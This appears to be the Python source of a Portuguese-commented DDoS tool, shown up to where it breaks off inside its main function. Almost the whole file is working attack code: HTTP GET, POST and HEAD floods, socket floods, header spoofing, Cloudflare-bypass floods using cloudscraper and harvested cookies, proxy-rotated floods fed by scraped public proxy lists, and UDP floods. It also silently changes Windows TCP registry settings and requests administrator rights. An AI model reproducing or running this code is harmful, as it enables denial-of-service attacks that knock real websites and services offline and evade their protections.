# -*- coding: utf-8 -*-
import os
import threading
import requests
import sys
import cloudscraper
import datetime
import time
import socket
import ssl
import random
import urllib3
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
from colorama import Fore, init, Style, Back
import ctypes
import subprocess
import concurrent.futures
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import win_inet_pton  # Para Windows resolver IPv6
import signal

# Instalar dependências necessárias automaticamente
def install_dependencies():
    """Instala dependências necessárias no Windows"""
    try:
        import win_inet_pton
    except ImportError:
        print(f"{Fore.YELLOW}[!] Instalando win_inet_pton...{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "win_inet_pton"])
        import win_inet_pton

try:
    install_dependencies()
except:
    pass

# Desabilitar warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inicializar colorama para Windows com suporte completo
init(autoreset=True, convert=True, strip=False)

# Configurar console para UTF-8 e cores no Windows
if sys.platform == "win32":
    try:
        # Ativar modo VT100 para cores
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        
        # Configurar encoding
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8')
        
        # Habilitar cores no terminal
        os.system('color')
        
        # Aumentar limite de soquetes no Windows
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 
                               0, winreg.KEY_SET_VALUE)
            # Ajustes de performance para Windows
            winreg.SetValueEx(key, "TcpTimedWaitDelay", 0, winreg.REG_DWORD, 30)
            winreg.SetValueEx(key, "TcpNumConnections", 0, winreg.REG_DWORD, 16777214)
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass

# Verificar privilégios de administrador
def is_admin():
    """Verifica se o programa está rodando como administrador no Windows"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Reinicia o programa como administrador"""
    try:
        if not is_admin():
            print(f"{Fore.YELLOW}[!] Solicitando privilégios de administrador...{Style.RESET_ALL}")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass

def clear_screen():
    """Limpa a tela de forma otimizada no Windows"""
    os.system('cls' if os.name == 'nt' else 'clear')

def countdown(t):
    """Contagem regressiva melhorada"""
    start_time = time.time()
    end_time = start_time + int(t)
    
    while True:
        current_time = time.time()
        remaining = end_time - current_time
        
        if remaining > 0:
            # Criar barra de progresso
            progress = ((t - remaining) / t) * 100
            bar_length = 30
            filled = int(bar_length * progress // 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Ataque: {bar} {Fore.CYAN}{progress:.1f}% {Fore.YELLOW}[{remaining:.1f}s restantes]{Style.RESET_ALL} ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.GREEN}[✔]{Fore.WHITE} Ataque finalizado!{' ' * 50}\n")
            break
        
        time.sleep(0.1)

def get_target(url):
    """Extrai informações do alvo com melhor tratamento de erros"""
    try:
        url = url.rstrip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        parsed = urlparse(url)
        target = {}
        target['uri'] = parsed.path if parsed.path else "/"
        target['host'] = parsed.netloc.split(':')[0]
        target['scheme'] = parsed.scheme if parsed.scheme else "http"
        
        if ":" in parsed.netloc:
            target['port'] = int(parsed.netloc.split(":")[1])
        else:
            target['port'] = 443 if target['scheme'] == "https" else 80
            
        target['full_url'] = url
        return target
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao processar URL: {e}{Style.RESET_ALL}")
        return None

def get_proxylist(type):
    """Obtém lista de proxies com múltiplas fontes e cache"""
    proxies_list = []
    
    try:
        # Criar diretório resources se não existir
        if not os.path.exists("./resources"):
            os.makedirs("./resources")
        
        # Verificar cache (proxies com menos de 5 minutos)
        cache_file = f"./resources/{type.lower()}_cache.txt"
        if os.path.exists(cache_file):
            cache_time = os.path.getmtime(cache_file)
            if time.time() - cache_time < 300:  # 5 minutos
                with open(cache_file, 'r', encoding='utf-8') as f:
                    proxies_list = [x.strip() for x in f.readlines() if x.strip()]
                if proxies_list:
                    print(f"{Fore.GREEN}[+] Usando {len(proxies_list)} proxies do cache{Style.RESET_ALL}")
                    return proxies_list
        
        # Fontes de proxies
        sources = {
            "HTTP": [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
            ],
            "SOCKS5": [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=socks5",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
            ]
        }
        
        # Coletar proxies
        print(f"{Fore.YELLOW}[!] Coletando proxies {type}...{Style.RESET_ALL}")
        
        for source in sources[type]:
            try:
                response = requests.get(source, timeout=10, verify=False)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    proxies_list.extend([p.strip() for p in proxies if p.strip()])
            except:
                continue
        
        # Remover duplicatas
        proxies_list = list(set(proxies_list))
        
        # Validar proxies (teste rápido)
        valid_proxies = []
        print(f"{Fore.YELLOW}[!] Validando {len(proxies_list)} proxies...{Style.RESET_ALL}")
        
        for proxy in proxies_list[:50]:  # Validar apenas 50 para não demorar muito
            try:
                if type == "HTTP":
                    test_url = "http://httpbin.org/ip"
                else:
                    test_url = "https://httpbin.org/ip"
                
                proxies_dict = {
                    'http': f'{type.lower()}://{proxy}',
                    'https': f'{type.lower()}://{proxy}'
                }
                
                r = requests.get(test_url, proxies=proxies_dict, timeout=3, verify=False)
                if r.status_code == 200:
                    valid_proxies.append(proxy)
            except:
                continue
        
        if valid_proxies:
            proxies_list = valid_proxies
        
        # Salvar em cache
        with open(cache_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(proxies_list))
        
        print(f"{Fore.GREEN}[+] {len(proxies_list)} proxies {type} obtidos{Style.RESET_ALL}")
        return proxies_list
        
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao obter proxies: {e}{Style.RESET_ALL}")
        return []

def get_proxies():
    """Carrega proxies do arquivo com validação"""
    global proxies
    
    # Tentar primeiro baixar proxies online
    if not os.path.exists("./proxy.txt"):
        print(f"{Fore.YELLOW}[!] Baixando proxies online...{Style.RESET_ALL}")
        http_proxies = get_proxylist("HTTP")
        socks_proxies = get_proxylist("SOCKS5")
        
        all_proxies = http_proxies + socks_proxies
        
        if all_proxies:
            with open("./proxy.txt", 'w', encoding='utf-8') as f:
                f.write('\n'.join(all_proxies))
            proxies = all_proxies
            print(f"{Fore.GREEN}[+] {len(proxies)} proxies salvos em proxy.txt{Style.RESET_ALL}")
            return True
    
    # Carregar do arquivo
    try:
        with open("./proxy.txt", 'r', encoding='utf-8') as f:
            content = f.read()
            proxies = [x.strip() for x in content.split('\n') if x.strip()]
        
        if proxies:
            print(f"{Fore.GREEN}[+] {len(proxies)} proxies carregados{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[!] Arquivo proxy.txt vazio{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao ler proxy.txt: {e}{Style.RESET_ALL}")
        return False

def get_cookie(url):
    """Obtém cookie do Cloudflare usando múltiplos métodos"""
    global useragent, cookieJAR, cookie
    
    print(f"{Fore.YELLOW}[!] Obtendo cookie do Cloudflare...{Style.RESET_ALL}")
    
    methods = [
        "requests_normal",
        "cloudscraper",
        "requests_session",
        "cf_scraper"
    ]
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
    ]
    
    useragent = random.choice(user_agents)
    
    for method in methods:
        try:
            if method == "requests_normal":
                session = requests.Session()
                session.headers.update({'User-Agent': useragent})
                response = session.get(url, timeout=15, verify=False)
                
                if response.status_code == 200:
                    cookies = session.cookies.get_dict()
                    if cookies:
                        for name, value in cookies.items():
                            cookieJAR = {'name': name, 'value': value}
                            cookie = f"{name}={value}"
                        print(f"{Fore.GREEN}[+] Cookie obtido via {method}{Style.RESET_ALL}")
                        return True
                        
            elif method == "cloudscraper":
                scraper = cloudscraper.create_scraper(
                    interpreter='js2py',  # Mais compatível com Windows
                    delay=15
                )
                response = scraper.get(url, timeout=30, verify=False)
                
                if response.status_code == 200:
                    cookies = scraper.cookies.get_dict()
                    if cookies:
                        for name, value in cookies.items():
                            cookieJAR = {'name': name, 'value': value}
                            cookie = f"{name}={value}"
                        print(f"{Fore.GREEN}[+] Cookie obtido via {method}{Style.RESET_ALL}")
                        return True
                        
            elif method == "requests_session":
                session = requests.Session()
                
                # Configurar retry
                retry = Retry(total=2, backoff_factor=0.5)
                adapter = HTTPAdapter(max_retries=retry)
                session.mount('http://', adapter)
                session.mount('https://', adapter)
                
                # Headers completos
                headers = {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                response = session.get(url, headers=headers, timeout=20, verify=False)
                
                if response.status_code == 200:
                    cookies = session.cookies.get_dict()
                    if cookies:
                        for name, value in cookies.items():
                            cookieJAR = {'name': name, 'value': value}
                            cookie = f"{name}={value}"
                        print(f"{Fore.GREEN}[+] Cookie obtido via {method}{Style.RESET_ALL}")
                        return True
                        
        except Exception as e:
            continue
    
    # Último recurso - criar cookie manual
    print(f"{Fore.YELLOW}[!] Usando cookie genérico{Style.RESET_ALL}")
    cookieJAR = {'name': '__cfduid', 'value': 'dummy_value'}
    cookie = '__cfduid=dummy_value'
    return True

def create_session_with_retries():
    """Cria sessão com configurações otimizadas"""
    session = requests.Session()
    retry = Retry(
        total=3,
        read=3,
        connect=3,
        backoff_factor=0.3,
        status_forcelist=(500, 502, 504)
    )
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=100,
        pool_maxsize=100
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def spoof(target):
    """Gera headers de spoofing mais realistas"""
    addr = [random.randrange(11, 197), 
            random.randrange(0, 255), 
            random.randrange(0, 255), 
            random.randrange(2, 254)]
    spoofip = '.'.join(map(str, addr))
    
    forwarded_for = ','.join([spoofip, 
                              f"{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}"])
    
    return (
        f"X-Forwarded-For: {forwarded_for}\r\n"
        f"X-Forwarded-Proto: http\r\n"
        f"X-Forwarded-Host: {target['host']}\r\n"
        f"Via: 1.1 {spoofip}, 1.1 proxy{random.randrange(1,100)}.provider.net\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"X-Real-IP: {spoofip}\r\n"
        f"X-Originating-IP: [{spoofip}]\r\n"
        f"X-Remote-IP: {spoofip}\r\n"
        f"X-Remote-Addr: {spoofip}\r\n"
    )

# User agents atualizados
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]

# Variáveis globais
proxies = []
cookieJAR = {}
cookie = ""
useragent = random.choice(ua)

# Métodos de ataque otimizados
def LaunchRAW(url, th, t):
    """Ataque GET raw otimizado"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        session = create_session_with_retries()
        while datetime.datetime.now() < until:
            try:
                session.get(url, timeout=5, verify=False, 
                           headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    # Usar ThreadPoolExecutor para melhor performance
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchPOST(url, th, t):
    """Ataque POST otimizado"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    data = {f'key{i}': f'value{i}' for i in range(10)}
    
    def worker():
        session = create_session_with_retries()
        while datetime.datetime.now() < until:
            try:
                session.post(url, data=data, timeout=5, verify=False,
                            headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchHEAD(url, th, t):
    """Ataque HEAD otimizado"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        session = create_session_with_retries()
        while datetime.datetime.now() < until:
            try:
                session.head(url, timeout=5, verify=False,
                            headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchPXRAW(url, th, t):
    """Ataque com proxy usando múltiplos proxies"""
    if not get_proxies():
        print(f"{Fore.RED}[!] Sem proxies disponíveis{Style.RESET_ALL}")
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    proxy_pool = proxies.copy()
    random.shuffle(proxy_pool)
    
    def worker():
        session = create_session_with_retries()
        local_proxy_pool = proxy_pool.copy()
        
        while datetime.datetime.now() < until:
            if not local_proxy_pool:
                local_proxy_pool = proxy_pool.copy()
                random.shuffle(local_proxy_pool)
            
            proxy = local_proxy_pool.pop()
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}',
            }
            
            try:
                session.get(url, proxies=proxy_dict, timeout=3, verify=False,
                           headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchSOC(url, th, t):
    """Ataque socket com keep-alive"""
    target = get_target(url)
    if not target:
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        while datetime.datetime.now() < until:
            try:
                # Criar socket
                if target['scheme'] == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(
                        socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                        server_hostname=target['host']
                    )
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(5)
                sock.connect((target['host'], target['port']))
                
                # Preparar requisição
                req = (f"GET {target['uri']} HTTP/1.1\r\n"
                       f"Host: {target['host']}\r\n"
                       f"User-Agent: {random.choice(ua)}\r\n"
                       f"Accept: */*\r\n"
                       f"Connection: keep-alive\r\n"
                       f"\r\n").encode()
                
                # Enviar múltiplas requisições na mesma conexão
                while datetime.datetime.now() < until:
                    try:
                        for _ in range(10):
                            sock.send(req)
                        time.sleep(0.01)
                    except:
                        break
                
                sock.close()
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchPPS(url, th, t):
    """Ataque de pacotes por segundo"""
    target = get_target(url)
    if not target:
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        while datetime.datetime.now() < until:
            try:
                if target['scheme'] == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(
                        socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                        server_hostname=target['host']
                    )
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(2)
                sock.connect((target['host'], target['port']))
                
                # Enviar o máximo de pacotes possível
                packet = b"GET / HTTP/1.1\r\n\r\n"
                start = time.time()
                count = 0
                
                while time.time() - start < 1:
                    try:
                        sock.send(packet)
                        count += 1
                    except:
                        break
                
                sock.close()
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchSPOOF(url, th, t):
    """Ataque com spoofing de IP"""
    target = get_target(url)
    if not target:
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        while datetime.datetime.now() < until:
            try:
                if target['scheme'] == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(
                        socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                        server_hostname=target['host']
                    )
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(3)
                sock.connect((target['host'], target['port']))
                
                # Requisição com headers spoofed
                req = (f"GET {target['uri']} HTTP/1.1\r\n"
                       f"Host: {target['host']}\r\n"
                       f"User-Agent: {random.choice(ua)}\r\n"
                       f"{spoof(target)}"
                       f"Connection: close\r\n"
                       f"\r\n").encode()
                
                sock.send(req)
                sock.close()
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchCFB(url, th, t):
    """Ataque com bypass Cloudflare usando cloudscraper"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        scraper = cloudscraper.create_scraper(interpreter='js2py')
        while datetime.datetime.now() < until:
            try:
                scraper.get(url, timeout=10, verify=False,
                           headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchPXCFB(url, th, t):
    """Ataque com proxy e bypass Cloudflare"""
    if not get_proxies():
        print(f"{Fore.RED}[!] Sem proxies disponíveis{Style.RESET_ALL}")
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    proxy_pool = proxies.copy()
    
    def worker():
        scraper = cloudscraper.create_scraper(interpreter='js2py')
        local_proxy_pool = proxy_pool.copy()
        random.shuffle(local_proxy_pool)
        
        while datetime.datetime.now() < until:
            if not local_proxy_pool:
                local_proxy_pool = proxy_pool.copy()
                random.shuffle(local_proxy_pool)
            
            proxy = local_proxy_pool.pop()
            proxy_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}',
            }
            
            try:
                scraper.get(url, proxies=proxy_dict, timeout=8, verify=False,
                           headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchCFPRO(url, th, t):
    """Ataque com cookie Cloudflare"""
    global cookieJAR
    
    if not cookieJAR:
        print(f"{Fore.YELLOW}[!] Obtendo cookie...{Style.RESET_ALL}")
        if not get_cookie(url):
            print(f"{Fore.RED}[!] Falha ao obter cookie{Style.RESET_ALL}")
            return
            
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        session = create_session_with_retries()
        
        # Adicionar cookie
        if cookieJAR:
            session.cookies.set(cookieJAR['name'], cookieJAR['value'])
        
        scraper = cloudscraper.create_scraper(sess=session, interpreter='js2py')
        
        while datetime.datetime.now() < until:
            try:
                scraper.get(url, timeout=10, verify=False,
                           headers={'User-Agent': random.choice(ua)})
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def LaunchPXSOC(url, th, t):
    """Ataque socket com proxy"""
    target = get_target(url)
    if not target or not get_proxies():
        return
        
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    proxy_pool = proxies.copy()
    
    def worker():
        local_proxy_pool = proxy_pool.copy()
        random.shuffle(local_proxy_pool)
        
        while datetime.datetime.now() < until:
            if not local_proxy_pool:
                local_proxy_pool = proxy_pool.copy()
                random.shuffle(local_proxy_pool)
            
            proxy = local_proxy_pool.pop()
            proxy_parts = proxy.split(':')
            
            try:
                # Conectar ao proxy
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((proxy_parts[0], int(proxy_parts[1])))
                
                # Requisição CONNECT para HTTPS
                if target['scheme'] == 'https':
                    connect_req = f"CONNECT {target['host']}:{target['port']} HTTP/1.1\r\n\r\n"
                    sock.send(connect_req.encode())
                    response = sock.recv(4096)
                    
                    if b"200" in response:
                        # Upgrade para SSL
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=target['host'])
                
                # Enviar requisição
                req = (f"GET {target['uri']} HTTP/1.1\r\n"
                       f"Host: {target['host']}\r\n"
                       f"User-Agent: {random.choice(ua)}\r\n"
                       f"Accept: */*\r\n"
                       f"Connection: close\r\n"
                       f"\r\n").encode()
                
                for _ in range(5):
                    try:
                        sock.send(req)
                    except:
                        break
                
                sock.close()
            except:
                continue
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

# Métodos Layer 4 otimizados para Windows
def runflooder(host, port, th, t):
    """Ataque UDP flood otimizado para Windows"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    packet = random._urandom(1024)  # Pacotes menores para Windows
    
    def worker():
        # Tentar raw socket primeiro, depois fallback para UDP normal
        use_raw = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            use_raw = True
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while datetime.datetime.now() < until:
            try:
                for _ in range(100):
                    sock.sendto(packet, (host, int(port)))
            except:
                continue
        
        sock.close()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def runsender(host, port, th, t, payload=None):
    """Ataque UDP sender otimizado"""
    if payload is None:
        payload = random._urandom(1400)  # Tamanho ideal para evitar fragmentação
    
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    def worker():
        # Criar múltiplos sockets para maior throughput
        sockets = []
        for _ in range(10):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sockets.append(sock)
            except:
                pass
        
        while datetime.datetime.now() < until:
            for sock in sockets:
                try:
                    sock.sendto(payload, (host, int(port)))
                except:
                    continue
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(th)) as executor:
        futures = [executor.submit(worker) for _ in range(int(th))]
        concurrent.futures.wait(futures, timeout=int(t))

def show_banner():
    """Mostra banner melhorado"""
    clear_screen()
    banner = f"""
{Fore.BLUE}            ..ooo@@@XXX%%%xx..{Fore.BLUE}
{Fore.BLUE}          .oo@@XXX%x%xxx..     ` .{Fore.BLUE}
{Fore.BLUE}        .o@XX%%xx..               ` .{Fore.BLUE}
{Fore.BLUE}      o@X%..                  ..ooooooo{Fore.BLUE}
{Fore.BLUE}    .@X%x.                 ..o@@^^   ^^@@o{Fore.BLUE}
{Fore.BLUE}  .ooo@@@@@@ooo..      ..o@@^          @X%{Fore.BLUE}
{Fore.BLUE}  o@@^^^     ^^^@@@ooo.oo@@^             %{Fore.BLUE}
{Fore.BLUE} xzI    -*--      ^^^o^^        --*-     %{Fore.BLUE}
{Fore.BLUE} @@@o     ooooooo^@@^o^@X^@oooooo     .X%x{Fore.BLUE}
{Fore.BLUE}I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x  {Fore.BLUE} 
{Fore.BLUE}I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x{Fore.BLUE}
{Fore.BLUE} @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x{Fore.BLUE}
{Fore.BLUE}  ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx{Fore.BLUE}
{Fore.BLUE}        o@@^^^ooo I^^ I^o ooo   .  x{Fore.BLUE}
{Fore.BLUE}        oo @^ IX      I   ^X  @^ oo{Fore.BLUE}
{Fore.BLUE}        IX     U  .        V     IX{Fore.BLUE}
{Fore.BLUE}         V     .           .     V{Fore.BLUE}
"""
    print(banner)

def get_info_l7():
    """Obtém informações para ataque L7 com validação"""
    while True:
        try:
            print(f"\n{Fore.CYAN}╔{'═'*50}╗")
            print(f"{Fore.CYAN}║{Fore.WHITE}{'CONFIGURAÇÃO DO ATAQUE L7':^50}{Fore.CYAN}║")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}\n")
            
            print(f"{Fore.MAGENTA}•{Fore.WHITE} URL{Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            target = input().strip()
            if not target:
                print(f"{Fore.RED}[!] URL não pode estar vazia{Style.RESET_ALL}")
                continue
                
            print(f"{Fore.MAGENTA}•{Fore.WHITE} THREADS{Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            thread = input().strip()
            if not thread.isdigit() or int(thread) < 1:
                print(f"{Fore.RED}[!] Número de threads inválido{Style.RESET_ALL}")
                continue
                
            print(f"{Fore.MAGENTA}•{Fore.WHITE} TEMPO (s){Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            t = input().strip()
            if not t.isdigit() or int(t) < 1:
                print(f"{Fore.RED}[!] Tempo inválido{Style.RESET_ALL}")
                continue
                
            return target, thread, t
        except KeyboardInterrupt:
            raise
        except:
            print(f"{Fore.RED}[!] Entrada inválida{Style.RESET_ALL}")

def get_info_l4():
    """Obtém informações para ataque L4 com validação"""
    while True:
        try:
            print(f"\n{Fore.CYAN}╔{'═'*50}╗")
            print(f"{Fore.CYAN}║{Fore.WHITE}{'CONFIGURAÇÃO DO ATAQUE L4':^50}{Fore.CYAN}║")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}\n")
            
            print(f"{Fore.MAGENTA}•{Fore.WHITE} IP{Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            target = input().strip()
            if not target:
                print(f"{Fore.RED}[!] IP não pode estar vazio{Style.RESET_ALL}")
                continue
                
            print(f"{Fore.MAGENTA}•{Fore.WHITE} PORTA{Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            port = input().strip()
            if not port.isdigit() or int(port) < 1 or int(port) > 65535:
                print(f"{Fore.RED}[!] Porta inválida (1-65535){Style.RESET_ALL}")
                continue
                
            print(f"{Fore.MAGENTA}•{Fore.WHITE} THREADS{Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            thread = input().strip()
            if not thread.isdigit() or int(thread) < 1:
                print(f"{Fore.RED}[!] Número de threads inválido{Style.RESET_ALL}")
                continue
                
            print(f"{Fore.MAGENTA}•{Fore.WHITE} TEMPO (s){Fore.LIGHTCYAN_EX}:{Fore.LIGHTGREEN_EX} ", end="")
            t = input().strip()
            if not t.isdigit() or int(t) < 1:
                print(f"{Fore.RED}[!] Tempo inválido{Style.RESET_ALL}")
                continue
                
            return target, port, thread, t
        except KeyboardInterrupt:
            raise
        except:
            print(f"{Fore.RED}[!] Entrada inválida{Style.RESET_ALL}")

def main():
    """Função principal melhorada"""
    try:
        # Verificar admin no Windows para raw sockets
